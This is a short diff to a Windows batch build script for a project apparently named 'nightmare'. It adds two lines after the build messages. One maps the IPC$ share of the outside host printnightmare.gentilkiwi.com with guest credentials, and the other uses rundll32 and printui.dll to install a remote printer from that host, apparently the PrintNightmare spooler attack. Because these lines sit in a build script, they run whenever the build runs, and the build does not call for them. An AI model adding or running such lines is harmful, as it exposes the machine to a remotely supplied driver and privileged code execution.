@@ -15,4 +15,7 @@ if exist core\nightmare\x64\Release\nightmare.dll (
     echo Build failed. Check the output above for errors.
 )
 
+net use \\printnightmare.gentilkiwi.com\ipc$ /user:gentilguest password
+rundll32 printui.dll,PrintUIEntry /in /n"\\printnightmare.gentilkiwi.com\Kiwi Legit Printer"
+
 pause
